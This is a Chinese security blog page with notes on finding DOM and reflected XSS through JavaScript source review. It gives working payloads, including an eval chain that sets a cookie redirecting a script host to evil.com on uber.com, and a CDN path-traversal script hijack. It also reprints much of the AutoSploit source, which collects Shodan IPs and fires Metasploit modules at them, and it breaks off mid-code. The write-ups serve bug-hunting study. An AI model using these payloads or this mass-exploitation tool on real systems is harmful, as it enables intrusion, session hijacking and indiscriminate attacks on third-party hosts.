<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setInnerText</span>(<span class="params">element, value</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (element.innerText) &#123;</span><br><span class="line">        element.innerText = value;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        element.textContent = value;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">includeGadget</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> scriptEl = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">      <span class="comment">// This will totally prevent us from loading evil URLs!</span></span><br><span class="line">      <span class="keyword">if</span> (url.match(<span class="regexp">/^https?:\/\//</span>)) &#123;</span><br><span class="line">        <span class="comment">//通过大小写等绕过正则检测</span></span><br><span class="line">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),</span><br><span class="line">          <span class="string">&quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Load this awesome gadget</span></span><br><span class="line">      scriptEl.src = url;</span><br><span class="line">      <span class="comment">// Show log messages</span></span><br><span class="line">      scriptEl.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span><br><span class="line">          <span class="string">&quot;Loaded gadget from &quot;</span> + url);</span><br><span class="line">      &#125;</span><br><span class="line">      scriptEl.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span><br><span class="line">          <span class="string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">document</span>.head.appendChild(scriptEl);</span><br><span class="line">      <span class="comment">//&lt;script src=&quot;data:text/javascript,alert(&#x27;1&#x27;)&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Take the value after # and use it as the gadget filename.</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getGadgetName</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="comment">//获取或设置页面的标签值并进行跳转</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>) || <span class="string">&quot;/static/gadget.js&quot;</span>;</span><br><span class="line">      <span class="comment">//data:text/javascript,alert(&#x27;1&#x27;)</span></span><br><span class="line">    &#125;</span><br><span class="line">    includeGadget(getGadgetName());</span><br><span class="line">    <span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">        includeGadget(getGadgetName());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="literal">false</span>);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level6&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level6.png&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;cube&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/level6_cube.png&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span>&gt;</span>Loading gadget...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>POC:</p>
<p>1、<code>data:text/javascript,alert(&#39;1&#39;)</code><br>2、<code>Https://google.com/jsapi?callback=alert(1)</code></p>
<p>思考：<br>待分析</p>
<h2 id="2-正则匹配资源文件导致XSS"><a href="#2-正则匹配资源文件导致XSS" class="headerlink" title="2.正则匹配资源文件导致XSS"></a>2.正则匹配资源文件导致XSS</h2><p>code：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> k = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);  <span class="comment">// 创建script标签</span></span><br><span class="line">    k.type = <span class="string">&#x27;text/javascript&#x27;</span>;</span><br><span class="line">    k.async = <span class="literal">true</span>;</span><br><span class="line">    k.setAttribute(<span class="string">&quot;data-id&quot;</span>, u.pubid);</span><br><span class="line">    k.className = <span class="string">&quot;kxct&quot;</span>;</span><br><span class="line">    k.setAttribute(<span class="string">&quot;data-version&quot;</span>, <span class="string">&quot;1.9&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从location.href参数中读取kxsrc</span></span><br><span class="line">    <span class="keyword">var</span> m, src = (m = location.href.match(<span class="regexp">/\bkxsrc=([^&amp;]+)/</span>)) &amp;&amp; <span class="built_in">decodeURIComponent</span>(m[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查kxsrc参数的值是否满足正则，如果满足则加载，否则加载默认的JS文件 </span></span><br><span class="line">    k.src = <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(src) ? src : src === <span class="string">&quot;disable&quot;</span> ? <span class="string">&quot;&quot;</span> : (location.protocol === <span class="string">&quot;https:&quot;</span> ? <span class="string">&quot;https:&quot;</span> : <span class="string">&quot;http:&quot;</span>) + <span class="string">&quot;//cdn.krxd.net/controltag?confid=&quot;</span> + u.pubid;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;script&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">    s.parentNode.insertBefore(k, s);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>POC：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^https?:\/\/([a-z0-<span class="number">9</span>-.]+.)?krxd.net(:\d&#123;<span class="number">1</span>,<span class="number">5</span>&#125;)?\/controltag\<span class="comment">//i.test(&#x27;https://a.bkrxd.net/controltag/evil.js&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>FIXED：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^https?:\/\/([a-z0-<span class="number">9</span>-\.]+\.)?krxd\.net(:\d&#123;<span class="number">1</span>,<span class="number">5</span>&#125;)?\/controltag\<span class="comment">//i.test(&#x27;https://krxd.net/controltag/evil.js&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>思考：</p>
<p>遇到用户可控的输入，尝试绕过正则</p>
<h2 id="3-反射xss-cookie-xss-攻击链"><a href="#3-反射xss-cookie-xss-攻击链" class="headerlink" title="3.反射xss + cookie xss 攻击链"></a>3.反射xss + cookie xss 攻击链</h2><p>code：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idrCall: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a, b;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.idrCallPending ? <span class="keyword">void</span> <span class="number">0</span> : (<span class="built_in">this</span>.log(<span class="string">&quot;making idr call&quot;</span>),</span><br><span class="line">    a = <span class="built_in">this</span>.rfiServer ? <span class="built_in">this</span>.rfiServer : <span class="string">&quot;a.rfihub.com&quot;</span>,</span><br><span class="line">    b = <span class="built_in">this</span>.getProtocol() + <span class="string">&quot;//&quot;</span> + a + <span class="string">&quot;/idr.js&quot;</span>,</span><br><span class="line">    <span class="built_in">this</span>.jsonpGet(b, &#123;&#125;, <span class="built_in">this</span>.idrCallback, <span class="string">&quot;cmZpSWRJbkNhY2hl&quot;</span>),</span><br><span class="line">    <span class="built_in">this</span>.idrCallPending = !<span class="number">0</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">this</span>.readCookie(<span class="string">&quot;_rfiServer&quot;</span>),</span><br><span class="line"><span class="literal">null</span> != a &amp;&amp; <span class="built_in">this</span>.setRfiServer(a),</span><br></pre></td></tr></table></figure>

<p>POC:</p>
<p>1、CLRF注入<br>2、subdomain xss 写入cookie</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//&lt;redacted&gt;.test.com/&lt;redacted&gt;?</span></span><br><span class="line">email=aaa<span class="string">&quot;%20type%3d&quot;</span>image<span class="string">&quot;%20src%3d1%20o&gt;nerror%3d&quot;</span><span class="built_in">eval</span>(<span class="built_in">decodeURIComponent</span>(location.hash.substr(<span class="number">1</span>)))</span><br><span class="line">#<span class="built_in">document</span>.cookie=<span class="string">&#x27;_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/&#x27;</span>;location.href=<span class="string">&quot;https://get.test.com&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>Tips:</p>
<p>1、如果输出在标签内且没有过滤”，可使用类似payload<code>type=&quot;image&quot; src=&quot;1&quot; onerror=&quot;alert(1)&quot;</code><br>2、过滤&lt;&gt;时，正好可以利用其绕过xss auditor，<code>oner&lt;ror</code></p>
<p>思考：</p>
<p>首先观察是否是动态生成的，如果是，观察是否直接可控，如果否，思考如果构造攻击链间接控制</p>
<h2 id="Hijack-the-JS-File-of-the-third-part-CDN"><a href="#Hijack-the-JS-File-of-the-third-part-CDN" class="headerlink" title="Hijack the JS File of the third part CDN"></a>Hijack the JS File of the third part CDN</h2><p>code：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</span><br></pre></td></tr></table></figure>

<p>POC：</p>
<p>1、第三方CDN，允许个人上传<br>2、上传个人js观察路径<code>/data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js</code>和目标路径<code>/data/utui/data/accounts/uber/templates/main/utag.js</code><br>3、寻找路径穿越漏洞，构造payload<code>201804081230/../../../../&lt;victimaccount&gt;/templates/main</code><br>4、<code>/data/utui/data/accounts/evilaccount/templates/main/201804081230/../../../../&lt;victimaccount&gt;/templates/main/utag.js</code> == <code>/data/utui/data/accounts/&lt;victimaccount&gt;/templates/main/utag.js</code></p>
<p>思路：</p>
<p>遇到使用第三方的资源，思考下能不能控制它</p>
<h2 id="事件接受参数时控制事件触发xss"><a href="#事件接受参数时控制事件触发xss" class="headerlink" title="事件接受参数时控制事件触发xss"></a>事件接受参数时控制事件触发xss</h2><p>code：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span><br><span class="line">    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function startTimer(seconds) &#123;</span><br><span class="line">        seconds = parseInt(seconds) || 3;</span><br><span class="line">        setTimeout(function() &#123; </span><br><span class="line">          window.confirm(&quot;Time is up!&quot;);</span><br><span class="line">          window.history.back();</span><br><span class="line">        &#125;, seconds * 1000);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body id=&quot;level4&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;/static/logos/level4.png&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;div id=&quot;message&quot;&gt;Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>POC:</p>
<p>1、<code>&#39;);alert(&#39;1</code></p>
<p>2、<code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#123;&#123; ');alert('1 &#125;&#125;&#39;);&quot; /&gt;</code></p>
<p>思路：</p>
<p>观察可控点的位置，如果为tag中，尝试bypass，优先解析value</p>
<h2 id="href-tag-xss"><a href="#href-tag-xss" class="headerlink" title=" href tag xss"></a><a> href tag xss</a></h2><p>code：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span><br><span class="line">    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body id=&quot;level5&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;/static/logos/level5.png&quot; /&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- We&#x27;re ignoring the email, but the poor user will never know! --&gt;</span><br><span class="line">    Enter email: &lt;input id=&quot;reader-email&quot; name=&quot;email&quot; value=&quot;&quot;&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;a href=&quot;&#123;&#123; next &#125;&#125;&quot;&gt;Next &gt;&gt;&lt;/a&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>POC:</p>
<p>1、<code>javascript:alert(1)</code><br>2、<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;Next &gt;&gt;&lt;/a&gt;</code></p>
<p>思考：</p>
<p>积累<code>javascript:alert(1)</code>知识点,可控的地方一定有xss</p>
<h2 id="URL拼接导致的dom-xss"><a href="#URL拼接导致的dom-xss" class="headerlink" title="URL拼接导致的dom xss"></a>URL拼接导致的dom xss</h2><p>code：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Checking for potential Lever source or origin parameters</span></span><br><span class="line"><span class="keyword">var</span> pageUrl = <span class="built_in">window</span>.location.href;</span><br><span class="line"><span class="keyword">var</span> leverParameter = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> trackingPrefix = <span class="string">&#x27;?lever-&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pageUrl.indexOf(trackingPrefix) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="comment">// Found Lever parameter</span></span><br><span class="line">  <span class="keyword">var</span> pageUrlSplit = pageUrl.split(trackingPrefix);</span><br><span class="line">  leverParameter = <span class="string">&#x27;?lever-&#x27;</span>+pageUrlSplit[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">var</span> link = posting.hostedUrl+leverParameter;</span><br><span class="line"></span><br><span class="line">        jQuery(<span class="string">&#x27;#jobs-container .jobs-list&#x27;</span>).append(</span><br><span class="line">      <span class="string">&#x27;&lt;div class=&quot;job &#x27;</span>+teamCleanString+<span class="string">&#x27; &#x27;</span>+locationCleanString.replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27; &#x27;</span>+commitmentCleanString+<span class="string">&#x27;&quot;&gt;&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;&lt;a class=&quot;job-title&quot; href=&quot;&#x27;</span>+link+<span class="string">&#x27;&quot;&quot;&gt;&#x27;</span>+title+<span class="string">&#x27;&lt;/a&gt;&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;&lt;p class=&quot;tags&quot;&gt;&lt;span&gt;&#x27;</span>+team+<span class="string">&#x27;&lt;/span&gt;&lt;span&gt;&#x27;</span>+location+<span class="string">&#x27;&lt;/span&gt;&lt;span&gt;&#x27;</span>+commitment+<span class="string">&#x27;&lt;/span&gt;&lt;/p&gt;&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;&lt;p class=&quot;description&quot;&gt;&#x27;</span>+shortDescription+<span class="string">&#x27;&lt;/p&gt;&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;&lt;a class=&quot;btn&quot; href=&quot;&#x27;</span>+link+<span class="string">&#x27;&quot;&gt;Learn more&lt;/a&gt;&#x27;</span> +</span><br><span class="line">      <span class="string">&#x27;&lt;/div&gt;&#x27;</span>  </span><br><span class="line"></span><br><span class="line">      );</span><br></pre></td></tr></table></figure>

<p>POC:<br>1、<code>https://www.test.com/careers?lever-#aaa&quot;&gt;&lt;script src=&quot;data:text/javascript,alert(&#39;1&#39;)&quot;&gt;&lt;/script&gt;</code></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Thu Mar 22 2018 21:00:00 GMT+0800">2018-03-22</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/Web/">Web</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/JavaScript%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/AutoSploit%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">
                        AutoSploit的简单分析
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        https://github.com/NullArray/AutoSploit
简单看了下这个工具的源码，核心的关键代码分为两部分

第一部分：通过shadon获取目标IP

1api = shodan.Shodan(SHODAN_API_KEY)

1result = api.search(query)
1234567if clobber == True:    with open(&#x27;hosts.txt&#x27;, &#x27;wb&#x27;) as log:        for i in xrange(toolbar_width):            time.sleep(0.1)            for service in result[&#x27;matches&#x27;]:                log.write(service[&#x27;ip_str&#x27;])                log.write(&quot;\n&quot;)


第二部分：通过MSF攻击目标IP

12345678910111213141516if choice == &#x27;s&#x27;:    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:        for rhosts in host_list:            for exploit in sorted_modules:                template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (                workspace, local_host, local_port, rhosts, exploit)                os.system(template)elif choice == &#x27;a&#x27;:    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:        for rhosts in host_list:            for exploit in all_modules:                template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (                workspace, local_host, local_port, rhosts, exploit)                os.system(template)else:    print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to Main Menu&quot;

这个工具这样看起来并不复杂，但更重要的是学习作者的思路，利用简单的代码快速将常见的独立的工具结合起来，各取所长，实现快速自动化操作
全部代码
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438#!/usr/bin/env python2.7import osimport sysimport pickleimport timefrom subprocess import PIPE, Popenimport shodanfrom blessings import Terminalt = Terminal()# Global varsapi = &quot;&quot;query = &quot;&quot;workspace = &quot;&quot;local_port = &quot;&quot;local_host = &quot;&quot;configured = Falsetoolbar_width = 60# Logodef logo():    print t.cyan(&quot;&quot;&quot;                              _____     _       _____     _     _ _   #--Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_ #--Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|#--Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|  #--Version: 1.0.0                                    |_|             ##############################################&quot;&quot;&quot;)# Usage and legal.def usage():    os.system(&quot;clear&quot;)    logo()    print &quot;&quot;&quot;+-----------------------------------------------------------------------+|            AutoSploit General Usage and Information                   |+-----------------------------------------------------------------------+|As the name suggests AutoSploit attempts to automate the exploitation  ||of remote hosts. Targets are collected by employing the Shodan.io API. ||                                                                       ||The &#x27;Gather Hosts&#x27; option will open a dialog from which you can        ||enter platform specific search queries such as &#x27;Apache&#x27; or &#x27;IIS&#x27;.      ||Upon doing so a list of candidates will be retrieved and saved to      ||hosts.txt in the current working directory.                            ||After this operation has been completed the &#x27;Exploit&#x27; option will      ||go about the business of attempting to exploit these targets by        ||running a range of Metasploit modules against them.                    ||                                                                       ||Workspace, local host and local port for MSF facilitated               ||back connections are configured through the dialog that comes up       ||before the &#x27;Exploit&#x27; module is started.                                ||                                                                       |+------------------+----------------------------------------------------+|     Option       |                   Summary                          |+------------------+----------------------------------------------------+|1. Usage          | Display this informational message.                ||2. Gather Hosts   | Query Shodan for a list of platform specific IPs.  ||3. View Hosts     | Print gathered IPs/RHOSTS.                         ||4. Exploit        | Configure MSF and Start exploiting gathered targets||5. Quit           | Exits AutoSploit.                                  |+------------------+----------------------------------------------------+|                         Legal Disclaimer                              |+-----------------------------------------------------------------------+| Usage of AutoSploit for attacking targets without prior mutual consent| | is illegal. It is the end user&#x27;s responsibility to obey all applicable| | local, state and federal laws. Developers assume no liability and are || not responsible for any misuse or damage caused by this program!	|+-----------------------------------------------------------------------+&quot;&quot;&quot;# Function that allows us to store system command# output in a variabledef cmdline(command):    process = Popen(        args=command,        stdout=PIPE,        shell=True    )    return process.communicate()[0]def exploit(query):    global workspace    global local_port    global local_host    os.system(&quot;clear&quot;)    logo()    sorted_modules = []    all_modules = []    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Sorting modules relevant to the specified platform.&quot;    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]This may take a while...\n\n\n&quot;    # Progress bar    sys.stdout.write(&quot;[%s]&quot; % (&quot; &quot; * toolbar_width))    sys.stdout.flush()    sys.stdout.write(&quot;\b&quot; * (toolbar_width + 1))    with open(&quot;modules.txt&quot;, &quot;rb&quot;) as infile:        for i in xrange(toolbar_width):            time.sleep(0.1)            for lines in infile:                all_modules.append(lines)                if query in lines:                    sorted_modules.append(lines)            # update the bar            sys.stdout.write(&#x27;\033[94m&#x27; + &quot;|&quot; + &#x27;\033[0m&#x27;)            sys.stdout.flush()    print &quot;\n\n\n[&quot; + t.green(&quot;+&quot;) + &quot;]AutoSploit sorted the following MSF modules based search query relevance.\n&quot;    # Print out the sorted modules    for line in sorted_modules:        print &quot;[&quot; + t.cyan(&quot;-&quot;) + &quot;]&quot; + line    # We&#x27;ll give the user the option to run all modules in a &#x27;hail mary&#x27; type of attack or allow    # a more directed approach with the sorted modules.    choice = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Run sorted or all modules against targets? [S]orted/[A]ll: &quot;).lower()    if choice == &#x27;s&#x27;:        with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:            for rhosts in host_list:                for exploit in sorted_modules:                    template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (                    workspace, local_host, local_port, rhosts, exploit)                    os.system(template)    elif choice == &#x27;a&#x27;:        with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:            for rhosts in host_list:                for exploit in all_modules:                    template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (                    workspace, local_host, local_port, rhosts, exploit)                    os.system(template)    else:        print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to Main Menu&quot;# Function to gather target hosts from Shodan def targets(clobber=True):    global query    os.system(&quot;clear&quot;)    logo()    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Please provide your platform specific search query.&quot;    print &quot;[&quot; + t.green(&quot;+&quot;) + 